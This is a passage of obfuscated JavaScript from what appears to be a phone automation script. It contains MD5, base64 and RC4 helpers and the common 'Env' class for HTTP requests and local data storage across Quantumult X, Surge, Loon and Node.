    return _0x2db9a0(_0x34dfdf(_0x1bfe5a, _0x5ab898), _0x939c08);
  }
  function _0x389ec5(_0x4fe335, _0x57caa2, _0x143e80, _0x54c026, _0x196a12, _0x13059c, _0x33c6d8) {
    _0x4fe335 = _0x2db9a0(_0x4fe335, _0x2db9a0(_0x2db9a0(_0x15b51f(_0x57caa2, _0x143e80, _0x54c026), _0x196a12), _0x33c6d8));
    return _0x2db9a0(_0x34dfdf(_0x4fe335, _0x13059c), _0x57caa2);
  }
  function _0x340e56(_0x58d1a6) {
    for (var _0x3dac25, _0x386d1d = _0x58d1a6.length, _0x4e0eb1 = _0x386d1d + 8, _0x597fed = (_0x4e0eb1 - _0x4e0eb1 % 64) / 64, _0x50faa2 = 16 * (_0x597fed + 1), _0x4d82fa = new Array(_0x50faa2 - 1), _0x4d08d3 = 0, _0xb0eb45 = 0; _0x386d1d > _0xb0eb45;) {
      _0x3dac25 = (_0xb0eb45 - _0xb0eb45 % 4) / 4;
      _0x4d08d3 = _0xb0eb45 % 4 * 8;
      _0x4d82fa[_0x3dac25] = _0x4d82fa[_0x3dac25] | _0x58d1a6.charCodeAt(_0xb0eb45) << _0x4d08d3;
      _0xb0eb45++;
    }
    _0x3dac25 = (_0xb0eb45 - _0xb0eb45 % 4) / 4;
    _0x4d08d3 = _0xb0eb45 % 4 * 8;
    _0x4d82fa[_0x3dac25] = _0x4d82fa[_0x3dac25] | 128 << _0x4d08d3;
    _0x4d82fa[_0x50faa2 - 2] = _0x386d1d << 3;
    _0x4d82fa[_0x50faa2 - 1] = _0x386d1d >>> 29;
    return _0x4d82fa;
  }
  function _0x3f639c(_0x136263) {
    var _0x38a9b5,
      _0xdd4553,
      _0x5bf0de = "",
      _0x391f34 = "";
    for (_0xdd4553 = 0; 3 >= _0xdd4553; _0xdd4553++) {
      _0x38a9b5 = _0x136263 >>> 8 * _0xdd4553 & 255;
      _0x391f34 = "0" + _0x38a9b5.toString(16);
      _0x5bf0de += _0x391f34.substr(_0x391f34.length - 2, 2);
    }
    return _0x5bf0de;
  }
  function _0x377752(_0x527047) {
    _0x527047 = _0x527047.replace(/\r\n/g, "\n");
    for (var _0x4340d8 = "", _0x9f4654 = 0; _0x9f4654 < _0x527047.length; _0x9f4654++) {
      var _0x4f0023 = _0x527047.charCodeAt(_0x9f4654);
      128 > _0x4f0023 ? _0x4340d8 += String.fromCharCode(_0x4f0023) : _0x4f0023 > 127 && 2048 > _0x4f0023 ? (_0x4340d8 += String.fromCharCode(_0x4f0023 >> 6 | 192), _0x4340d8 += String.fromCharCode(63 & _0x4f0023 | 128)) : (_0x4340d8 += String.fromCharCode(_0x4f0023 >> 12 | 224), _0x4340d8 += String.fromCharCode(_0x4f0023 >> 6 & 63 | 128), _0x4340d8 += String.fromCharCode(63 & _0x4f0023 | 128));
    }
    return _0x4340d8;
  }
  var _0x59dccb,
    _0x523227,
    _0x4df5df,
    _0x51fb60,
    _0x4e6de5,
    _0x4d77c8,
    _0x14e92f,
    _0x13f877,
    _0xa8f19d,
    _0x3984a8 = [],
    _0x4d205f = 7,
    _0x44fa33 = 12,
    _0x5c841b = 17,
    _0x2363e1 = 22,
    _0x5d4138 = 5,
    _0x4ab69a = 9,
    _0xba6950 = 14,
    _0x33c7ef = 20,
    _0x11f918 = 4,
    _0xf825e = 11,
    _0x57dedf = 16,
    _0x1bfe7a = 23,
    _0x1dad35 = 6,
    _0x4844e3 = 10,
    _0x35b1e6 = 15,
    _0x54494c = 21;
  for (_0x20be72 = _0x377752(_0x20be72), _0x3984a8 = _0x340e56(_0x20be72), _0x4d77c8 = 1732584193, _0x14e92f = 4023233417, _0x13f877 = 2562383102, _0xa8f19d = 271733878, _0x59dccb = 0; _0x59dccb < _0x3984a8.length; _0x59dccb += 16) {
    _0x523227 = _0x4d77c8;
    _0x4df5df = _0x14e92f;
    _0x51fb60 = _0x13f877;
    _0x4e6de5 = _0xa8f19d;
    _0x4d77c8 = _0x2713aa(_0x4d77c8, _0x14e92f, _0x13f877, _0xa8f19d, _0x3984a8[_0x59dccb + 0], _0x4d205f, 3614090360);
    _0xa8f19d = _0x2713aa(_0xa8f19d, _0x4d77c8, _0x14e92f, _0x13f877, _0x3984a8[_0x59dccb + 1], _0x44fa33, 3905402710);
    _0x13f877 = _0x2713aa(_0x13f877, _0xa8f19d, _0x4d77c8, _0x14e92f, _0x3984a8[_0x59dccb + 2], _0x5c841b, 606105819);
    _0x14e92f = _0x2713aa(_0x14e92f, _0x13f877, _0xa8f19d, _0x4d77c8, _0x3984a8[_0x59dccb + 3], _0x2363e1, 3250441966);
    _0x4d77c8 = _0x2713aa(_0x4d77c8, _0x14e92f, _0x13f877, _0xa8f19d, _0x3984a8[_0x59dccb + 4], _0x4d205f, 4118548399);
    _0xa8f19d = _0x2713aa(_0xa8f19d, _0x4d77c8, _0x14e92f, _0x13f877, _0x3984a8[_0x59dccb + 5], _0x44fa33, 1200080426);
    _0x13f877 = _0x2713aa(_0x13f877, _0xa8f19d, _0x4d77c8, _0x14e92f, _0x3984a8[_0x59dccb + 6], _0x5c841b, 2821735955);
    _0x14e92f = _0x2713aa(_0x14e92f, _0x13f877, _0xa8f19d, _0x4d77c8, _0x3984a8[_0x59dccb + 7], _0x2363e1, 4249261313);
    _0x4d77c8 = _0x2713aa(_0x4d77c8, _0x14e92f, _0x13f877, _0xa8f19d, _0x3984a8[_0x59dccb + 8], _0x4d205f, 1770035416);
    _0xa8f19d = _0x2713aa(_0xa8f19d, _0x4d77c8, _0x14e92f, _0x13f877, _0x3984a8[_0x59dccb + 9], _0x44fa33, 2336552879);
    _0x13f877 = _0x2713aa(_0x13f877, _0xa8f19d, _0x4d77c8, _0x14e92f, _0x3984a8[_0x59dccb + 10], _0x5c841b, 4294925233);
    _0x14e92f = _0x2713aa(_0x14e92f, _0x13f877, _0xa8f19d, _0x4d77c8, _0x3984a8[_0x59dccb + 11], _0x2363e1, 2304563134);
    _0x4d77c8 = _0x2713aa(_0x4d77c8, _0x14e92f, _0x13f877, _0xa8f19d, _0x3984a8[_0x59dccb + 12], _0x4d205f, 1804603682);
    _0xa8f19d = _0x2713aa(_0xa8f19d, _0x4d77c8, _0x14e92f, _0x13f877, _0x3984a8[_0x59dccb + 13], _0x44fa33, 4254626195);
    _0x13f877 = _0x2713aa(_0x13f877, _0xa8f19d, _0x4d77c8, _0x14e92f, _0x3984a8[_0x59dccb + 14], _0x5c841b, 2792965006);
    _0x14e92f = _0x2713aa(_0x14e92f, _0x13f877, _0xa8f19d, _0x4d77c8, _0x3984a8[_0x59dccb + 15], _0x2363e1, 1236535329);
    _0x4d77c8 = _0x406439(_0x4d77c8, _0x14e92f, _0x13f877, _0xa8f19d, _0x3984a8[_0x59dccb + 1], _0x5d4138, 4129170786);
    _0xa8f19d = _0x406439(_0xa8f19d, _0x4d77c8, _0x14e92f, _0x13f877, _0x3984a8[_0x59dccb + 6], _0x4ab69a, 3225465664);
    _0x13f877 = _0x406439(_0x13f877, _0xa8f19d, _0x4d77c8, _0x14e92f, _0x3984a8[_0x59dccb + 11], _0xba6950, 643717713);
    _0x14e92f = _0x406439(_0x14e92f, _0x13f877, _0xa8f19d, _0x4d77c8, _0x3984a8[_0x59dccb + 0], _0x33c7ef, 3921069994);
    _0x4d77c8 = _0x406439(_0x4d77c8, _0x14e92f, _0x13f877, _0xa8f19d, _0x3984a8[_0x59dccb + 5], _0x5d4138, 3593408605);
    _0xa8f19d = _0x406439(_0xa8f19d, _0x4d77c8, _0x14e92f, _0x13f877, _0x3984a8[_0x59dccb + 10], _0x4ab69a, 38016083);
    _0x13f877 = _0x406439(_0x13f877, _0xa8f19d, _0x4d77c8, _0x14e92f, _0x3984a8[_0x59dccb + 15], _0xba6950, 3634488961);
    _0x14e92f = _0x406439(_0x14e92f, _0x13f877, _0xa8f19d, _0x4d77c8, _0x3984a8[_0x59dccb + 4], _0x33c7ef, 3889429448);
    _0x4d77c8 = _0x406439(_0x4d77c8, _0x14e92f, _0x13f877, _0xa8f19d, _0x3984a8[_0x59dccb + 9], _0x5d4138, 568446438);
    _0xa8f19d = _0x406439(_0xa8f19d, _0x4d77c8, _0x14e92f, _0x13f877, _0x3984a8[_0x59dccb + 14], _0x4ab69a, 3275163606);
    _0x13f877 = _0x406439(_0x13f877, _0xa8f19d, _0x4d77c8, _0x14e92f, _0x3984a8[_0x59dccb + 3], _0xba6950, 4107603335);
    _0x14e92f = _0x406439(_0x14e92f, _0x13f877, _0xa8f19d, _0x4d77c8, _0x3984a8[_0x59dccb + 8], _0x33c7ef, 1163531501);
    _0x4d77c8 = _0x406439(_0x4d77c8, _0x14e92f, _0x13f877, _0xa8f19d, _0x3984a8[_0x59dccb + 13], _0x5d4138, 2850285829);
    _0xa8f19d = _0x406439(_0xa8f19d, _0x4d77c8, _0x14e92f, _0x13f877, _0x3984a8[_0x59dccb + 2], _0x4ab69a, 4243563512);
    _0x13f877 = _0x406439(_0x13f877, _0xa8f19d, _0x4d77c8, _0x14e92f, _0x3984a8[_0x59dccb + 7], _0xba6950, 1735328473);
    _0x14e92f = _0x406439(_0x14e92f, _0x13f877, _0xa8f19d, _0x4d77c8, _0x3984a8[_0x59dccb + 12], _0x33c7ef, 2368359562);
    _0x4d77c8 = _0x34e28c(_0x4d77c8, _0x14e92f, _0x13f877, _0xa8f19d, _0x3984a8[_0x59dccb + 5], _0x11f918, 4294588738);
    _0xa8f19d = _0x34e28c(_0xa8f19d, _0x4d77c8, _0x14e92f, _0x13f877, _0x3984a8[_0x59dccb + 8], _0xf825e, 2272392833);
    _0x13f877 = _0x34e28c(_0x13f877, _0xa8f19d, _0x4d77c8, _0x14e92f, _0x3984a8[_0x59dccb + 11], _0x57dedf, 1839030562);
    _0x14e92f = _0x34e28c(_0x14e92f, _0x13f877, _0xa8f19d, _0x4d77c8, _0x3984a8[_0x59dccb + 14], _0x1bfe7a, 4259657740);
    _0x4d77c8 = _0x34e28c(_0x4d77c8, _0x14e92f, _0x13f877, _0xa8f19d, _0x3984a8[_0x59dccb + 1], _0x11f918, 2763975236);
    _0xa8f19d = _0x34e28c(_0xa8f19d, _0x4d77c8, _0x14e92f, _0x13f877, _0x3984a8[_0x59dccb + 4], _0xf825e, 1272893353);
    _0x13f877 = _0x34e28c(_0x13f877, _0xa8f19d, _0x4d77c8, _0x14e92f, _0x3984a8[_0x59dccb + 7], _0x57dedf, 4139469664);
    _0x14e92f = _0x34e28c(_0x14e92f, _0x13f877, _0xa8f19d, _0x4d77c8, _0x3984a8[_0x59dccb + 10], _0x1bfe7a, 3200236656);
    _0x4d77c8 = _0x34e28c(_0x4d77c8, _0x14e92f, _0x13f877, _0xa8f19d, _0x3984a8[_0x59dccb + 13], _0x11f918, 681279174);
    _0xa8f19d = _0x34e28c(_0xa8f19d, _0x4d77c8, _0x14e92f, _0x13f877, _0x3984a8[_0x59dccb + 0], _0xf825e, 3936430074);
    _0x13f877 = _0x34e28c(_0x13f877, _0xa8f19d, _0x4d77c8, _0x14e92f, _0x3984a8[_0x59dccb + 3], _0x57dedf, 3572445317);
    _0x14e92f = _0x34e28c(_0x14e92f, _0x13f877, _0xa8f19d, _0x4d77c8, _0x3984a8[_0x59dccb + 6], _0x1bfe7a, 76029189);
    _0x4d77c8 = _0x34e28c(_0x4d77c8, _0x14e92f, _0x13f877, _0xa8f19d, _0x3984a8[_0x59dccb + 9], _0x11f918, 3654602809);
    _0xa8f19d = _0x34e28c(_0xa8f19d, _0x4d77c8, _0x14e92f, _0x13f877, _0x3984a8[_0x59dccb + 12], _0xf825e, 3873151461);
    _0x13f877 = _0x34e28c(_0x13f877, _0xa8f19d, _0x4d77c8, _0x14e92f, _0x3984a8[_0x59dccb + 15], _0x57dedf, 530742520);
    _0x14e92f = _0x34e28c(_0x14e92f, _0x13f877, _0xa8f19d, _0x4d77c8, _0x3984a8[_0x59dccb + 2], _0x1bfe7a, 3299628645);
    _0x4d77c8 = _0x389ec5(_0x4d77c8, _0x14e92f, _0x13f877, _0xa8f19d, _0x3984a8[_0x59dccb + 0], _0x1dad35, 4096336452);
    _0xa8f19d = _0x389ec5(_0xa8f19d, _0x4d77c8, _0x14e92f, _0x13f877, _0x3984a8[_0x59dccb + 7], _0x4844e3, 1126891415);
    _0x13f877 = _0x389ec5(_0x13f877, _0xa8f19d, _0x4d77c8, _0x14e92f, _0x3984a8[_0x59dccb + 14], _0x35b1e6, 2878612391);
    _0x14e92f = _0x389ec5(_0x14e92f, _0x13f877, _0xa8f19d, _0x4d77c8, _0x3984a8[_0x59dccb + 5], _0x54494c, 4237533241);
    _0x4d77c8 = _0x389ec5(_0x4d77c8, _0x14e92f, _0x13f877, _0xa8f19d, _0x3984a8[_0x59dccb + 12], _0x1dad35, 1700485571);
    _0xa8f19d = _0x389ec5(_0xa8f19d, _0x4d77c8, _0x14e92f, _0x13f877, _0x3984a8[_0x59dccb + 3], _0x4844e3, 2399980690);
    _0x13f877 = _0x389ec5(_0x13f877, _0xa8f19d, _0x4d77c8, _0x14e92f, _0x3984a8[_0x59dccb + 10], _0x35b1e6, 4293915773);
    _0x14e92f = _0x389ec5(_0x14e92f, _0x13f877, _0xa8f19d, _0x4d77c8, _0x3984a8[_0x59dccb + 1], _0x54494c, 2240044497);
    _0x4d77c8 = _0x389ec5(_0x4d77c8, _0x14e92f, _0x13f877, _0xa8f19d, _0x3984a8[_0x59dccb + 8], _0x1dad35, 1873313359);
    _0xa8f19d = _0x389ec5(_0xa8f19d, _0x4d77c8, _0x14e92f, _0x13f877, _0x3984a8[_0x59dccb + 15], _0x4844e3, 4264355552);
    _0x13f877 = _0x389ec5(_0x13f877, _0xa8f19d, _0x4d77c8, _0x14e92f, _0x3984a8[_0x59dccb + 6], _0x35b1e6, 2734768916);
    _0x14e92f = _0x389ec5(_0x14e92f, _0x13f877, _0xa8f19d, _0x4d77c8, _0x3984a8[_0x59dccb + 13], _0x54494c, 1309151649);
    _0x4d77c8 = _0x389ec5(_0x4d77c8, _0x14e92f, _0x13f877, _0xa8f19d, _0x3984a8[_0x59dccb + 4], _0x1dad35, 4149444226);
    _0xa8f19d = _0x389ec5(_0xa8f19d, _0x4d77c8, _0x14e92f, _0x13f877, _0x3984a8[_0x59dccb + 11], _0x4844e3, 3174756917);
    _0x13f877 = _0x389ec5(_0x13f877, _0xa8f19d, _0x4d77c8, _0x14e92f, _0x3984a8[_0x59dccb + 2], _0x35b1e6, 718787259);
    _0x14e92f = _0x389ec5(_0x14e92f, _0x13f877, _0xa8f19d, _0x4d77c8, _0x3984a8[_0x59dccb + 9], _0x54494c, 3951481745);
    _0x4d77c8 = _0x2db9a0(_0x4d77c8, _0x523227);
    _0x14e92f = _0x2db9a0(_0x14e92f, _0x4df5df);
    _0x13f877 = _0x2db9a0(_0x13f877, _0x51fb60);
    _0xa8f19d = _0x2db9a0(_0xa8f19d, _0x4e6de5);
  }
  var _0xc003f8 = _0x3f639c(_0x4d77c8) + _0x3f639c(_0x14e92f) + _0x3f639c(_0x13f877) + _0x3f639c(_0xa8f19d);
  return _0xc003f8.toLowerCase();
}
function FxPCnMKLw7() {
  _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
  this.encode = function (_0x1247f5) {
    var _0x16a079 = "",
      _0x4b6083,
      _0x27f887,
      _0x1dbb29,
      _0x132506,
      _0x17b433,
      _0x3801e1,
      _0x10e3ea,
      _0x2a9b83 = 0;
    _0x1247f5 = _utf8_encode(_0x1247f5);
    while (_0x2a9b83 < _0x1247f5.length) {
      _0x4b6083 = _0x1247f5.charCodeAt(_0x2a9b83++);
      _0x27f887 = _0x1247f5.charCodeAt(_0x2a9b83++);
      _0x1dbb29 = _0x1247f5.charCodeAt(_0x2a9b83++);
      _0x132506 = _0x4b6083 >> 2;
      _0x17b433 = (_0x4b6083 & 3) << 4 | _0x27f887 >> 4;
      _0x3801e1 = (_0x27f887 & 15) << 2 | _0x1dbb29 >> 6;
      _0x10e3ea = _0x1dbb29 & 63;
      if (isNaN(_0x27f887)) {
        _0x3801e1 = _0x10e3ea = 64;
      } else {
        isNaN(_0x1dbb29) && (_0x10e3ea = 64);
      }
      _0x16a079 = _0x16a079 + _keyStr.charAt(_0x132506) + _keyStr.charAt(_0x17b433) + _keyStr.charAt(_0x3801e1) + _keyStr.charAt(_0x10e3ea);
    }
    return _0x16a079;
  };
  this.decode = function (_0x40c2cf) {
    var _0xae1a30 = "",
      _0x34e183,
      _0x35bb9d,
      _0x318146,
      _0x5c342e,
      _0x5c5942,
      _0x2683cc,
      _0x4073e6,
      _0x303379 = 0;
    _0x40c2cf = _0x40c2cf.replace(/[^A-Za-z0-9\+\/\=]/g, "");
    while (_0x303379 < _0x40c2cf.length) {
      _0x5c342e = _keyStr.indexOf(_0x40c2cf.charAt(_0x303379++));
      _0x5c5942 = _keyStr.indexOf(_0x40c2cf.charAt(_0x303379++));
      _0x2683cc = _keyStr.indexOf(_0x40c2cf.charAt(_0x303379++));
      _0x4073e6 = _keyStr.indexOf(_0x40c2cf.charAt(_0x303379++));
      _0x34e183 = _0x5c342e << 2 | _0x5c5942 >> 4;
      _0x35bb9d = (_0x5c5942 & 15) << 4 | _0x2683cc >> 2;
      _0x318146 = (_0x2683cc & 3) << 6 | _0x4073e6;
      _0xae1a30 = _0xae1a30 + String.fromCharCode(_0x34e183);
      _0x2683cc != 64 && (_0xae1a30 = _0xae1a30 + String.fromCharCode(_0x35bb9d));
      _0x4073e6 != 64 && (_0xae1a30 = _0xae1a30 + String.fromCharCode(_0x318146));
    }
    _0xae1a30 = _utf8_decode(_0xae1a30);
    return _0xae1a30;
  };
  _utf8_encode = function (_0x229839) {
    _0x229839 = _0x229839.replace(/\r\n/g, "\n");
    var _0x2583d0 = "";
    for (var _0x5f48ec = 0; _0x5f48ec < _0x229839.length; _0x5f48ec++) {
      var _0x2f8752 = _0x229839.charCodeAt(_0x5f48ec);
      if (_0x2f8752 < 128) {
        _0x2583d0 += String.fromCharCode(_0x2f8752);
      } else {
        _0x2f8752 > 127 && _0x2f8752 < 2048 ? (_0x2583d0 += String.fromCharCode(_0x2f8752 >> 6 | 192), _0x2583d0 += String.fromCharCode(_0x2f8752 & 63 | 128)) : (_0x2583d0 += String.fromCharCode(_0x2f8752 >> 12 | 224), _0x2583d0 += String.fromCharCode(_0x2f8752 >> 6 & 63 | 128), _0x2583d0 += String.fromCharCode(_0x2f8752 & 63 | 128));
      }
    }
    return _0x2583d0;
  };
  _utf8_decode = function (_0xa5494d) {
    c1 = c2 = 0;
    var _0x15bffd = "",
      _0x294c71 = 0,
      _0x58d71e = c1;
    while (_0x294c71 < _0xa5494d.length) {
      _0x58d71e = _0xa5494d.charCodeAt(_0x294c71);
      if (_0x58d71e < 128) {
        _0x15bffd += String.fromCharCode(_0x58d71e);
        _0x294c71++;
      } else {
        _0x58d71e > 191 && _0x58d71e < 224 ? (c2 = _0xa5494d.charCodeAt(_0x294c71 + 1), _0x15bffd += String.fromCharCode((_0x58d71e & 31) << 6 | c2 & 63), _0x294c71 += 2) : (c2 = _0xa5494d.charCodeAt(_0x294c71 + 1), c3 = _0xa5494d.charCodeAt(_0x294c71 + 2), _0x15bffd += String.fromCharCode((_0x58d71e & 15) << 12 | (c2 & 63) << 6 | c3 & 63), _0x294c71 += 3);
      }
    }
    return _0x15bffd;
  };
}
function rc4(_0x2ba3c6, _0x2cfbcc) {
  var _0xa35f36 = Array(256),
    _0x21178c = Array(_0x2ba3c6.length);
  for (var _0x27d0a7 = 0; _0x27d0a7 < 256; _0x27d0a7++) {
    _0xa35f36[_0x27d0a7] = _0x27d0a7;
    var _0xb8fc62 = (_0xb8fc62 + _0xa35f36[_0x27d0a7] + _0x2cfbcc.charCodeAt(_0x27d0a7 % _0x2cfbcc.length)) % 256,
      _0x555454 = _0xa35f36[_0x27d0a7];
    _0xa35f36[_0x27d0a7] = _0xa35f36[_0xb8fc62];
    _0xa35f36[_0xb8fc62] = _0x555454;
  }
  for (var _0x27d0a7 = 0; _0x27d0a7 < _0x2ba3c6.length; _0x27d0a7++) {
    _0x21178c[_0x27d0a7] = _0x2ba3c6.charCodeAt(_0x27d0a7);
  }
  for (var _0x39727c = 0; _0x39727c < _0x21178c.length; _0x39727c++) {
    var _0x27d0a7 = (_0x27d0a7 + 1) % 256,
      _0xb8fc62 = (_0xb8fc62 + _0xa35f36[_0x27d0a7]) % 256,
      _0x555454 = _0xa35f36[_0x27d0a7];
    _0xa35f36[_0x27d0a7] = _0xa35f36[_0xb8fc62];
    _0xa35f36[_0xb8fc62] = _0x555454;
    var _0x37e609 = (_0xa35f36[_0x27d0a7] + _0xa35f36[_0xb8fc62] % 256) % 256;
    _0x21178c[_0x39727c] = String.fromCharCode(_0x21178c[_0x39727c] ^ _0xa35f36[_0x37e609]);
  }
  return _0x21178c.join("");
}
function Env(t, e) {
  class s {
    constructor(t) {
      this.env = t;
    }
    send(t, e = "GET") {
      t = "string" == typeof t ? {
        url: t
      } : t;
      let s = this.get;
      "POST" === e && (s = this.post);
      return new Promise((e, i) => {
        s.call(this, t, (t, s, r) => {
          t ? i(t) : e(s);
        });
      });
    }
    get(t) {
      return this.send.call(this.env, t);
    }
    post(t) {
      return this.send.call(this.env, t, "POST");
    }
  }
  return new class {
    constructor(t, e) {
      this.name = t;
      this.http = new s(this);
      this.data = null;
      this.dataFile = "box.dat";
      this.logs = [];
      this.isMute = !1;
      this.isNeedRewrite = !1;
      this.logSeparator = "\n";
      this.encoding = "utf-8";
      this.startTime = new Date().getTime();
      Object.assign(this, e);
      this.log("", `🔔${this.name}, 开始!`);
    }
    isNode() {
      return "undefined" != typeof module && !!module.exports;
    }
    isQuanX() {
      return "undefined" != typeof $task;
    }
    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }
    isLoon() {
      return "undefined" != typeof $loon;
    }
    isShadowrocket() {
      return "undefined" != typeof $rocket;
    }
    toObj(t, e = null) {
      try {
        return JSON.parse(t);
      } catch {
        return e;
      }
    }
    toStr(t, e = null) {
      try {
        return JSON.stringify(t);
      } catch {
        return e;
      }
    }
    getjson(t, e) {
      let s = e;
      const i = this.getdata(t);
      if (i) {
        try {
          s = JSON.parse(this.getdata(t));
        } catch {}
      }
      return s;
    }
    setjson(t, e) {
      try {
        return this.setdata(JSON.stringify(t), e);
      } catch {
        return !1;
      }
    }
    getScript(t) {
      return new Promise(e => {
        this.get({
          url: t
        }, (t, s, i) => e(i));
      });
    }
    runScript(t, e) {
      return new Promise(s => {
        let i = this.getdata("@chavy_boxjs_userCfgs.httpapi");
        i = i ? i.replace(/\n/g, "").trim() : i;
        let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
        r = r ? 1 * r : 20;
        r = e && e.timeout ? e.timeout : r;
        const [o, h] = i.split("@"),
          n = {
            url: `http://${h}/v1/scripting/evaluate`,
            body: {
              script_text: t,
              mock_type: "cron",
              timeout: r
            },
            headers: {
              "X-Key": o,
              Accept: "*/*"
            }
          };
        this.post(n, (t, e, i) => s(i));
      }).catch(t => this.logErr(t));
    }
    loaddata() {
      if (!this.isNode()) {
        return {};
      }
      {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const t = this.path.resolve(this.dataFile),
          e = this.path.resolve(process.cwd(), this.dataFile),
          s = this.fs.existsSync(t),
          i = !s && this.fs.existsSync(e);
        if (!s && !i) {
          return {};
        }
        {
          const i = s ? t : e;
          try {
            return JSON.parse(this.fs.readFileSync(i));
          } catch (t) {
            return {};
          }
        }
      }
    }
    writedata() {
      if (this.isNode()) {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const t = this.path.resolve(this.dataFile),
          e = this.path.resolve(process.cwd(), this.dataFile),
          s = this.fs.existsSync(t),
          i = !s && this.fs.existsSync(e),
          r = JSON.stringify(this.data);
        s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r);
      }
    }
    lodash_get(t, e, s) {
      const i = e.replace(/\[(\d+)\]/g, ".$1").split(".");
      let r = t;
      for (const t of i) if (r = Object(r)[t], void 0 === r) {
        return s;
      }
      return r;
    }
    lodash_set(t, e, s) {
      return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t);
    }
    getdata(t) {
      let e = this.getval(t);
      if (/^@/.test(t)) {
        const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t),
          r = s ? this.getval(s) : "";
        if (r) {
          try {
            const t = JSON.parse(r);
            e = t ? this.lodash_get(t, i, "") : e;
          } catch (t) {
            e = "";
          }
        }
      }
      return e;
    }
    setdata(t, e) {
      let s = !1;
      if (/^@/.test(e)) {
        const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e),
          o = this.getval(i),
          h = i ? "null" === o ? null : o || "{}" : "{}";
        try {
          const e = JSON.parse(h);
          this.lodash_set(e, r, t);
          s = this.setval(JSON.stringify(e), i);
        } catch (e) {
          const o = {};
          this.lodash_set(o, r, t);
          s = this.setval(JSON.stringify(o), i);
        }
      } else {
        s = this.setval(t, e);
      }
      return s;
    }
    getval(t) {
      return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null;
    }
    setval(t, e) {
      return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null;
    }
    initGotEnv(t) {
      this.got = this.got ? this.got : require("got");
      this.cktough = this.cktough ? this.cktough : require("tough-cookie");
      this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar();
      t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar));
    }
    get(t, e = () => {}) {
      if (t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient.get(t, (t, s, i) => {
          !t && s && (s.body = i, s.statusCode = s.status);
          e(t, s, i);
        });
      } else {
        if (this.isQuanX()) {
          this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
            hints: !1
          }));
          $task.fetch(t).then(t => {
            const {
              statusCode: s,
              statusCode: i,
              headers: r,
              body: o
            } = t;
            e(null, {
              status: s,
              statusCode: i,
              headers: r,
              body: o
            }, o);
          }, t => e(t));
        } else {
          if (this.isNode()) {
            let s = require("iconv-lite");
            this.initGotEnv(t);
            this.got(t).on("redirect", (t, e) => {
              try {
                if (t.headers["set-cookie"]) {
                  const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
                  s && this.ckjar.setCookieSync(s, null);
                  e.cookieJar = this.ckjar;
                }
              } catch (t) {
                this.logErr(t);
              }
            }).then(t => {
              const {
                statusCode: i,
                statusCode: r,
                headers: o,
                rawBody: h
              } = t;
              e(null, {
                status: i,
                statusCode: r,
                headers: o,
                rawBody: h
              }, s.decode(h, this.encoding));
            }, t => {
              const {
                message: i,
                response: r
              } = t;
              e(i, r, r && s.decode(r.rawBody, this.encoding));
            });
          }
        }
      }
    }
    post(t, e = () => {}) {
      const s = t.method ? t.method.toLocaleLowerCase() : "post";
      if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient[s](t, (t, s, i) => {
          !t && s && (s.body = i, s.statusCode = s.status);
          e(t, s, i);
        });
      } else {
        if (this.isQuanX()) {
          t.method = s;
          this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
            hints: !1
          }));
          $task.fetch(t).then(t => {
            const {
              statusCode: s,
              statusCode: i,
              headers: r,
              body: o
            } = t;
            e(null, {
              status: s,
              statusCode: i,
              headers: r,
              body: o
            }, o);
          }, t => e(t));
        } else {
          if (this.isNode()) {
            let i = require("iconv-lite");
            this.initGotEnv(t);
            const {
              url: r,
              ...o
            } = t;
            this.got[s](r, o).then(t => {
              const {
                statusCode: s,
                statusCode: r,
                headers: o,
                rawBody: h
              } = t;
              e(null, {
                status: s,
                statusCode: r,
                headers: o,
                rawBody: h
              }, i.decode(h, this.encoding));
            }, t => {
              const {
                message: s,
                response: r
              } = t;
              e(s, r, r && i.decode(r.rawBody, this.encoding));
            });
          }
        }
      }
    }
    time(t, e = null) {
      const s = e ? new Date(e) : new Date();
      let i = {
        "M+": s.getMonth() + 1,
        "d+": s.getDate(),
        "H+": s.getHours(),
        "m+": s.getMinutes(),
        "s+": s.getSeconds(),
        "q+": Math.floor((s.getMonth() + 3) / 3),
        S: s.getMilliseconds()
      };
      /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length)));
      for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length)));
      return t;
    }
    msg(e = t, s = "", i = "", r) {
      const o = t => {
